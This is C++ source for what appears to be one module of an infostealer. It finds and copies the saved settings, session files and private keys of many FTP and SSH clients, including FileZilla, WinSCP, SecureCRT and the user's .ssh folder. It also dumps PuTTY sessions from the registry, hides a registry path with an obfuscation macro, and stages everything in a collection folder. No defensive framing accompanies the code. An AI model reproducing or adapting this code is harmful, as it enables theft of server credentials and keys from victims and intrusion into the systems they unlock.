// FTP/SSH clients: FileZilla, WinSCP, PuTTY sessions (registry), Total Commander.
#include "../modules.h"
#include "../config.h"
#include "../core/obf.h"
#include "../core/sys.h"
#include <windows.h>
#include <sstream>

namespace {

struct FtTarget { const char* name; const char* path; };

const FtTarget k_ftp[] = {
    {"FileZilla", "%APPDATA%\\FileZilla"},
    {"FileZilla (program)", "%PROGRAMFILES%\\FileZilla Server"},
    {"WinSCP", "%APPDATA%\\WinSCP"},
    {"Total Commander", "%APPDATA%\\GHISLER"},
    {"SmartFTP", "%APPDATA%\\SmartFTP\\Client\\Favorites"},
    {"FTP Navigator", "%USERPROFILE%\\Documents\\FTP Navigator"},
    {"CoreFTP", "%APPDATA%\\CoreFTP"},
    {"FlashFXP", "%APPDATA%\\FlashFXP"},
    {"CuteFTP", "%APPDATA%\\CuteFTP"},
    {"FTPGetter", "%APPDATA%\\FTPGetter"},
    {"SSH keys", "%USERPROFILE%\\.ssh"},
    {"PuTTY keys", "%USERPROFILE%\\Documents\\PuTTY"},
    {"MobaXterm", "%APPDATA%\\MobaXterm"},
    {"MobaXterm (docs)", "%USERPROFILE%\\Documents\\MobaXterm"},
    {"Xshell", "%USERPROFILE%\\Documents\\NetSarang Computer\\Xshell\\Sessions"},
    {"SecureCRT", "%APPDATA%\\VanDyke\\Config"},
    {"Winscp ini", "%APPDATA%\\WinSCP.ini"},
};

std::string putty_sessions_registry() {
    std::ostringstream ss;
    HKEY k = nullptr;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
            util::widen(OBF("Software\\SimonTatham\\PuTTY\\Sessions")).c_str(),
            0, KEY_READ, &k) != ERROR_SUCCESS)
        return "";
    wchar_t sub[256];
    wchar_t data[1024];
    for (DWORD i = 0; RegEnumKeyW(k, i, sub, 256) == ERROR_SUCCESS; ++i) {
        ss << "== " << util::narrow(sub) << " ==\r\n";
        HKEY sk = nullptr;
        if (RegOpenKeyExW(k, sub, 0, KEY_READ, &sk) == ERROR_SUCCESS) {
            wchar_t name[256];
            DWORD name_len, data_len, type;
            for (DWORD j = 0; ; ++j) {
                name_len = 256;
                data_len = (DWORD)sizeof(data);
                type = 0;
                if (RegEnumValueW(sk, j, name, &name_len, nullptr, &type, (LPBYTE)data, &data_len) != ERROR_SUCCESS)
                    break;
                ss << "  " << util::narrow(name) << " = " << util::narrow(std::wstring(data, data_len / 2)) << "\r\n";
            }
            RegCloseKey(sk);
        }
    }
    RegCloseKey(k);
    return ss.str();
}

} // namespace

namespace mod {

void ftp_ssh(const std::string& staging) {
    std::ostringstream summary;
    int hits = 0;
    for (auto& f : k_ftp) {
        std::string path = util::expand_env(f.path);
        if (path.empty() || !util::path_exists(path)) continue;
        hits++;
        if (util::is_dir(path)) {
            util::copy_dir_recursive(path, util::join(staging, "ftp_ssh\\" + std::string(f.name)),
                                     {}, 16 * 1024 * 1024);
        } else {
            std::vector<uint8_t> data;
            if (util::read_file(path, data) && data.size() < cfg::MAX_GRAB_FILE)
                stage::stage_bytes("ftp_ssh", util::replace_all(std::string(f.name), " ", "_") + "_" + util::filename_of(path), data);
        }
        summary << "  " << f.name << ": " << path << "\r\n";
    }

    std::string putty = putty_sessions_registry();
    if (!putty.empty()) {
        stage::stage_text("ftp_ssh", "putty_sessions.txt", putty);
        summary << "  PuTTY registry sessions: yes\r\n";
        hits++;
    }

    stage::stage_text("ftp_ssh", "_summary.txt", summary.str());
    stage::note("ftp_ssh", std::to_string(hits) + " clients found");
}

} // namespace mod
